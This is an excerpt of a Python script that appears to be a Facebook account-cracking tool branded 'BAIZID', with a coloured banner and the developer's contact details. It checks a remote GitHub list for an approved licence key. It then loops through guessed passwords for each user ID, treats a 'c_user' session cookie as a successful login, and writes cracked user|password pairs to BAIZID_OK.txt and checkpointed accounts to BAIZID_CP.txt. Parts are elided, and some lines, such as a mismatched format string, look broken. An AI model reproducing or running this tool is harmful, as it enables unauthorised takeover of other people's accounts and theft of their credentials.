...
colouroff="\x1b[00m"
logo=""" 
\033[1;91m  ____    _    ___ ________ ____  
\033[1;92m | __ )  / \  |_ _|__  /_ _|  _ \ 
\033[1;93m |  _ \ / _ \  | |  / / | || | | |
\033[1;91m | |_) / ___ \ | | / /_ | || |_| |
\033[1;92m |____/_/   \_\___/____|___|____/ 

\033[1;92m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     \033[1;92m➣ \033[1;92mDEVOLPER   :            MD BAIZID MOSTAFA ASIF
     \033[1;91m➣ \033[1;91mFACEBOOK   :            MD Baizid Mostafa Asif
     \033[1;92m➣ \033[1;92mWHATSAPP   :            01996981319
     \033[1;91m➣ \033[1;91mGITHUB     :            BAIZID-171
...
a=requests.get("https://github.com/BAIZID-171/Approved-Server/blob/main/22UPDATE/Approved.txt").text
b=str(a)
key1=open("/storage/emulated/0/android8.txt",'r').read()
key2=str(key1)  
if key2 in b:
    ...
    print(yellow+"\n\t\tContact Admin ")
    os.system('xdg-open https://www.facebook.com/Baizid.171')
    exit()
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;92m Total OK : \x1b[1;91m %s  \x1b[1;92mBAIZID_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;91m Total CP :\x1b[1;91m   %s \x1b[1;91mBAIZID_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;93mPress enter to back BAIZID Menu ")
	    sarfraz()
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;93m[BAIZID-CHECK] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [BAIZID-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('BAIZID_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [BAIZID-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('BAIZID_CP.txt' , 'a').write('%s\n' % wrt)
                        break
